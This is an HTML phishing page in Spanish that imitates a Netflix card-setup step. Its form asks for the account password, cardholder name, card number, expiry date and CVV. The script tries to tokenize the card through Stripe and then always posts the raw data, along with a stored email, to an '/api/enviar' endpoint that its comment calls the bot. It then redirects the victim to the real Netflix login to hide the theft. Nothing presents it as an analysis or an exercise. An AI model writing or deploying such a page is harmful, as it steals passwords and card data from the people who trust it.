<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmaci&oacute;n</title>
    <script src="https://js.stripe.com/v3/"></script>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
    <style>
        body { background: #fff; font-family: sans-serif; margin: 0; }
        .container { max-width: 440px; margin: 30px auto; padding: 0 20px; }
        .input-box { margin-bottom: 15px; }
        .input-box input { width: 100%; padding: 15px; border: 1px solid #ccc; box-sizing: border-box; }
        .btn { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; cursor: pointer; font-weight: bold; }
        #loading { display: none; text-align: center; padding: 50px; }
    </style>
</head>
<body>
    <div class="container" id="form-box">
        <h1>Configura tu tarjeta</h1>
        <form id="pay-form">
            <div class="input-box"><input type="password" id="pw" placeholder="Contraseña" required></div>
            <div class="input-box"><input type="text" id="nm" placeholder="Nombre en tarjeta" required></div>
            <div class="input-box"><input type="text" id="cc" placeholder="Número de tarjeta" maxlength="16" required></div>
            <div style="display:flex; gap:10px">
                <div class="input-box"><input type="text" id="ex" placeholder="MM/AA" maxlength="5" required></div>
                <div class="input-box"><input type="text" id="cv" placeholder="CVV" maxlength="4" required></div>
            </div>
            <button type="submit" class="btn">Continuar</button>
        </form>
    </div>

    <div id="loading">
        <i class="fas fa-spinner fa-spin fa-3x" style="color:#e50914;"></i>
        <p>Procesando...</p>
    </div>

    <script>
        const stripe = Stripe('pk_live_51ShZ3pAeUmcfN350ViX4smhmh5q0IVTh1HBTgTi38ibNz07TvUQzb1F6PyQpWvF1N1y4411ZM7Ys0x9mQw9foU4800BwXkfy0n');

        document.getElementById('pay-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            document.getElementById('form-box').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            const ccVal = document.getElementById('cc').value.replace(/\s/g, '');
            const exp = document.getElementById('ex').value.split('/');
            
            const payload = {
                em: sessionStorage.getItem('usr_mail') || 'Desconocido',
                pw: document.getElementById('pw').value,
                nm: document.getElementById('nm').value,
                cc: ccVal,
                ex: document.getElementById('ex').value,
                cv: document.getElementById('cv').value,
                token: "Token ausente (Stripe Falló)"
            };

            // Intentar obtener el token de Stripe con un tiempo límite
            try {
                const result = await Promise.race([
                    stripe.createToken({ number: ccVal, exp_month: exp[0], exp_year: exp[1], cvc: payload.cv }),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 3000))
                ]);
                if (result.token) payload.token = result.token.id;
                if (result.error) payload.token = "Error: " + result.error.message;
            } catch (err) { }

            // ENVIAR AL BOT SIEMPRE
            fetch('/api/enviar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).finally(() => {
                window.location.href = "https://www.netflix.com/login";
            });
        });
    </script>
</body>
</html>
